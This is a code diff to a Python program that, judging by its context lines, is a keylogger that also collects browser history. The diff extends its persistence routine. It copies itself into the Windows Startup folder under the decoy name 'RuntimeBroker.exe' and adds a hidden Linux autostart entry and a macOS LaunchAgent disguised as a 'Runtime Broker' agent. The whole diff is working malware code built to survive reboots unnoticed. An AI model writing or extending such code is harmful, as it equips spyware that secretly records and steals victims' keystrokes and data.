@@ -188,27 +188,77 @@ def start_persistent_keylogger():
 
 # --- Persistenzfunktion ---
 def ensure_persistence():
-    if platform.system() != "Windows":
-        return
-    try:
-        startup_filename = "RuntimeBroker.exe"
-        source_path = sys.executable
-        startup_folder = os.path.join(
-            os.environ["APPDATA"],
-            "Microsoft",
-            "Windows",
-            "Start Menu",
-            "Programs",
-            "Startup",
-        )
-        dest_path = os.path.join(startup_folder, startup_filename)
-        if source_path.lower() == dest_path.lower():
-            return
-        if not os.path.exists(dest_path):
-            os.makedirs(startup_folder, exist_ok=True)
-            shutil.copyfile(source_path, dest_path)
-    except Exception as e:
-        logging.warning(f"Fehler bei Persistenz: {e}")
+    exe_path = sys.executable
+    if platform.system() == "Windows":
+        try:
+            startup_filename = "RuntimeBroker.exe"
+            startup_folder = os.path.join(
+                os.environ["APPDATA"],
+                "Microsoft",
+                "Windows",
+                "Start Menu",
+                "Programs",
+                "Startup",
+            )
+            dest_path = os.path.join(startup_folder, startup_filename)
+            if exe_path.lower() == dest_path.lower():
+                return
+            if not os.path.exists(dest_path):
+                os.makedirs(startup_folder, exist_ok=True)
+                shutil.copyfile(exe_path, dest_path)
+        except Exception as e:
+            logging.warning(f"Fehler bei Persistenz (Windows): {e}")
+    elif platform.system() == "Linux":
+        try:
+            autostart_dir = os.path.expanduser("~/.config/autostart")
+            os.makedirs(autostart_dir, exist_ok=True)
+            desktop_file = os.path.join(autostart_dir, "runtimebroker.desktop")
+            exec_line = exe_path
+            # Falls als .py ausgeführt, nutze python3
+            if exe_path.endswith(".py"):
+                exec_line = f"python3 {exe_path}"
+            desktop_content = f"""[Desktop Entry]
+Type=Application
+Name=Runtime Broker
+Exec={exec_line}
+X-GNOME-Autostart-enabled=true
+NoDisplay=true
+"""
+            with open(desktop_file, "w") as f:
+                f.write(desktop_content)
+            os.chmod(desktop_file, 0o755)
+        except Exception as e:
+            logging.warning(f"Fehler bei Persistenz (Linux): {e}")
+    elif platform.system() == "Darwin":
+        try:
+            plist_dir = os.path.expanduser("~/Library/LaunchAgents")
+            os.makedirs(plist_dir, exist_ok=True)
+            plist_file = os.path.join(plist_dir, "com.runtimebroker.agent.plist")
+            exec_line = exe_path
+            if exe_path.endswith(".py"):
+                exec_line = f"/usr/bin/python3 {exe_path}"
+            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.runtimebroker.agent</string>
+    <key>ProgramArguments</key>
+    <array>
+        {"".join([f"<string>{arg}</string>" for arg in exec_line.split()])}
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <false/>
+</dict>
+</plist>
+"""
+            with open(plist_file, "w") as f:
+                f.write(plist_content)
+            os.chmod(plist_file, 0o644)
+        except Exception as e:
+            logging.warning(f"Fehler bei Persistenz (macOS): {e}")
 
 # --- Browserverlauf-Funktion (erweitert für mehrere Browser) ---
 def get_browser_history(limit=50):
